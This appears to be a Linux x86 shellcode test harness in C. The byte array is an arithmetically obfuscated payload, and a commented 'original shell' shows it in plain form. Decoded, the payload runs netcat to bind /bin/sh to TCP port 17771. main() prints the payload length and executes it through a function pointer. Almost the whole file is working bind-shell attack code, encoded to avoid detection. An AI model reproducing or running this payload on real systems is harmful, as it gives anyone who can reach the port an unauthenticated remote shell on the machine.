#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xd2\x31\xdb\x50\xb8\x37\x37\x37\x31\x50\x05\xf7\x3f\x3a\x01"
"\x2d\x01\x01\x01\x01\x50\x89\xe6\x52\x05\x02\xb9\x02\x37\x50\x05\x01\x33"
"\xf6\x05\x83\xe8\x01\x50\x2d\x02\xf6\x03\x3f\x50\x89\xe7\x53\x05\x02\xc3"
"\x08\x34\x50\x05\x01\x33\xfb\x0a\x83\xe8\x01\x50\x89\xe3\x52\x56\x57\x53"
"\x89\xe1\x31\xc0\xb0\x0b\xcd\x80";


/*
Original shell
"\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50"
"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50"
"\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1"
"\xb0\x0b\xcd\x80";

*/

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
